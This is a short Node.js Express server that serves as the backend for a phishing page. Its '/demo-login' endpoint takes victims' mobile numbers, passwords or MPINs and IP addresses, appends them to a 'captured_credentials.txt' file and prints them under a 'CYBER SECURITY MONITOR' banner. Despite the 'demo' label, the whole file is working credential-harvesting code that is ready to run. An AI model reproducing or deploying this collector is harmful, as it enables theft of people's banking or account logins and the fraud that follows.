const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

async function startServer() {
  const chalk = (await import("chalk")).default;

  const app = express();

  app.use(cors());
  app.use(express.json());

  const filePath = path.join(__dirname, "captured_credentials.txt");

  app.post("/demo-login", (req, res) => {
    const { mobileNumber, password, rememberMe } = req.body;
    const victimIP = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const timestamp = new Date().toISOString();
    const line = `[${timestamp}] IP: ${victimIP} | Mobile: ${mobileNumber || "MISSING"} | Password: ${password || "MISSING"} | RememberMe: ${rememberMe}\n`;

    fs.appendFile(filePath, line, (err) => {
      if (err) console.error(chalk.red("[ERROR] Failed to save credentials:"), err);
    });

    console.log(chalk.green("==================================="));
    console.log(chalk.green("    CYBER SECURITY MONITOR v1.0"));
    console.log(chalk.green("==================================="));
    console.log(chalk.yellow(`Intercepting packet from: ${victimIP}`));
    console.log("");
    console.log(chalk.red("MOBILE NUMBER:"), chalk.white(mobileNumber || "MISSING"));
    console.log(chalk.red("PASSWORD/MPIN:"), chalk.white(password || "MISSING"));
    console.log(chalk.red("REMEMBER ME:"), chalk.white(rememberMe));
    console.log(chalk.green("[STATUS] Capture complete\n"));
    
    res.json({ message: "Login captured successfully" });
  });

  app.listen(5000, "0.0.0.0", () => {
    console.log(chalk.green("Server running on port 5000"));
  });
}

startServer();
